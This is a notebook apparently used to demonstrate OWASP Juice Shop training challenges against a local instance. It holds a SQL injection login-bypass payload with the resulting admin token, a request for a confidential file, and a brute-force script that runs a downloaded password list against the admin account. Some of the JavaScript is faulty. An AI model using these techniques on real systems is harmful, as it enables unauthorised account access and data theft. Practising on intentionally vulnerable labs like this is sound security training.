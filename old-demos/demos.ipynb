{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Demos of OWASP Juice Shop challenges\n",
    "\n",
    "## Access a confidential document"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "OK\n"
     ]
    }
   ],
   "source": [
    "using System.Net.Http;\n",
    "\n",
    "using(var client = new HttpClient()) {\n",
    "    var response = await client.GetAsync(\"http://localhost:3000/ftp/acquisitions.md\");\n",
    "\n",
    "    Console.WriteLine(response.StatusCode);\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "javascript"
    }
   },
   "outputs": [],
   "source": [
    "const request = new XMLHttpRequest();\n",
    "const url = 'http://localhost:3000/ftp/acquisitions.md';\n",
    "request.open(\"GET\", url);\n",
    "request.send();\n",
    "\n",
    "request.onload = (e) => {\n",
    "    alert(request.response);\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Provoke an error that is neither very gracefully nor consistently handled\n",
    "Any request that cannot be properly handled by the server will eventually be passed to a global error handling component that sends an error page to the client that includes a stack trace and other sensitive information. The restful API behaves in a similar way, passing back a JSON error object with sensitive data, such as SQL query strings."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "InternalServerError\n"
     ]
    }
   ],
   "source": [
    "using System.Net.Http;\n",
    "\n",
    "using(var client = new HttpClient()) {\n",
    "    var response = await client.GetAsync(\"http://localhost:3000/rest/qwertz\");\n",
    "\n",
    "    Console.WriteLine(response.StatusCode);\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Demonstrate a SQL Injection"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "javascript"
    }
   },
   "outputs": [],
   "source": [
    "#!value --name json\n",
    "{\n",
    "    \"email\": \"' OR TRUE--\",\n",
    "    \"password\": \"12345\"\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div><div></div><div></div><div><strong>Installed Packages</strong><ul><li><span>System.Net.Http.Json, 6.0.2-mauipre.1.22054.8</span></li></ul></div></div>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "#r \"nuget: System.Net.Http.Json, *-*\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [],
   "source": [
    "using System.Net.Http;\n",
    "using System.Net.Http.Json;"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0QWRtaW4ucG5nIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIyLTAyLTA5IDIyOjEzOjEzLjQxMiArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIyLTAyLTA5IDIyOjEzOjEzLjQxMiArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2NDQ0NDUwMzAsImV4cCI6MTY0NDQ2MzAzMH0.tamlFvGGPfP-BfTLKBzX9LPU7rKm_iRCPkHNpNRF2aJqHjsbQxFjv1Rga8cZcMM-XDv_MRDrP52cSZhDYNnQYJeTDjJdlFeAyzr3v64FFZX2qvmXO6mLn89_K1jP44NjgAvwxQgRB-nYO0wWfl4LftbOvLZ1XoNfB2kcq_2oeI0\n"
     ]
    }
   ],
   "source": [
    "#!share json --from value\n",
    "\n",
    "public struct AuthenticationToken {\n",
    "    public Authentication Authentication {get;set;}\n",
    "}\n",
    "\n",
    "public struct Authentication {\n",
    "    public string Token {get;set;}\n",
    "    public int Bid {get;set;}\n",
    "    public string Umail;\n",
    "}\n",
    "\n",
    "using(var client = new HttpClient()) {\n",
    "    var content = new StringContent(json, Encoding.UTF8, \"application/json\");\n",
    "    var response = await client.PostAsync(\"http://localhost:3000/rest/user/login\", content);\n",
    "    response.EnsureSuccessStatusCode();\n",
    "\n",
    "    var actualtoken = await response.Content.ReadFromJsonAsync<AuthenticationToken>();\n",
    "    Console.WriteLine(actualtoken.Authentication.Token);\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now let's try the same example with plain javascript"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "javascript"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Sending..."
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "var request = new XMLHttpRequest();\n",
    "var url = \"http://localhost:3000/rest/user/login\";\n",
    "var json =\n",
    "{\n",
    "    \"email\": \"' OR TRUE--\",\n",
    "    \"password\": \"12345\"\n",
    "};\n",
    "\n",
    "function reqListener () {\n",
    "    console.log(\"Done...\");\n",
    "    console.log(this.responseText);\n",
    "}\n",
    "request.addEventListener(\"load\", reqListener)\n",
    "request.open(\"POST\", url);\n",
    "request.setRequestHeader(\"Content-Type\", \"application/json\");\n",
    "console.log(\"Sending...\");\n",
    "request.send(json);\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Brute forcing login\n",
    "So this is an attempt to brute force the admin login credentials by download the list of common passwords from: https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt and then iterate over the list, trying to login with each password as credential to the admin account."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "javascript"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Request sent"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "const passwordUrl = \"https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt\";\n",
    "const localPasswordFile = \"./passwords.txt\";\n",
    "const request = new XMLHttpRequest();\n",
    "const url = 'http://localhost:3000/rest/user/login';\n",
    "\n",
    "request.onerror = () => {\n",
    "    console.log(\"Request failed\");\n",
    "};\n",
    "request.onload = (e) => {\n",
    "    console.log(\"Response received\");\n",
    "    var lines = request.response.split('\\n');\n",
    "    for(var line = 0; line < lines.length; line++){\n",
    "        var password = lines[line];\n",
    "        console.log(\"Testing password: \" + password);\n",
    "        const json =\n",
    "        {\n",
    "            \"email\": \"admin\",\n",
    "            \"password\": password\n",
    "        };\n",
    "        var request = new XMLHttpRequest();\n",
    "        request.open(\"POST\", url);\n",
    "        request.setRequestHeader(\"Content-Type\", \"application/json\");\n",
    "        request.send(json);\n",
    "        \n",
    "        request.onload = (e) => {\n",
    "            if(request.status == 200) {\n",
    "                console.log(\"Credentials found: \" + password);\n",
    "                throw new FatalError(\"Exiting...\")\n",
    "            }\n",
    "        }\n",
    "    }\n",
    "}\n",
    "\n",
    "request.open(\"GET\", passwordUrl);\n",
    "request.send();\n",
    "\n",
    "console.log(\"Request sent\");"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (C#)",
   "language": "C#",
   "name": ".net-csharp"
  },
  "language_info": {
   "file_extension": ".cs",
   "mimetype": "text/x-csharp",
   "name": "C#",
   "pygments_lexer": "csharp",
   "version": "9.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
